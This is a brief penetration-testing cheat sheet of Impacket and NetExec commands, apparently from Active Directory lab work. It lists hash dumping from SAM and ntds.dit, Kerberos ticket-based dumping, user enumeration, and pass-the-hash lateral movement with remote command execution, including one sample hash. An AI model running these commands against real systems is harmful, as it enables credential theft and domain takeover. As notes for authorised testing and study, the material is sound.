
- Password must be change smb:
```bash
smbpasswd -r $domain -U '$user'
```

- Extract password from SAM & SYSTEM :
```sh
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

- Extract hash from ntds.dit : 
```sh
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```
- Dump hash with Ccache of krbtgt :
```sh
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache 
secretsdump.py -k DC1.delegate.vl
```

- Enumerate RPC : 
```sh
samrdump.py <domain>/<username>:<password>@<target_IP>
```
- Enumerate domain user :
```sh
GetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50
```

- Lateral movement : 
```sh
psexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
smbexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
wmiexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
```

- Find the right  tool :
```sh
nxc smb 10.10.202.39 --use-kcache -x whoami
atexec.py -hashes ':a29542cb2707bf6d6c1d2c9311b0ff02' 'ws01'/'Administrator'@'10.10.202.39' whoami
```